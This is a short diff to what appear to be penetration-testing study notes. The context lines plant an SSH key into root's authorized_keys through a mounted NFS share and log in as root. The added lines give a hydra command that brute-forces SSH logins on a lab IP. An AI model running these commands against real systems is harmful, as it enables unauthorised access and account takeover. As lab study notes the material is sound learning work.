@@ -155,3 +155,8 @@ cat ~/.ssh/id_rsa.pub >> ~/mnt/nfs/root/.ssh/authorized_keys #>> appends to file
 #3. ssh into it machine
 ssh root@192.253.1.35 
 ```
+
+## Login Brute Forcing SSH
+```sh
+hydra -L user.list -P password.list ssh://10.129.42.197
+```
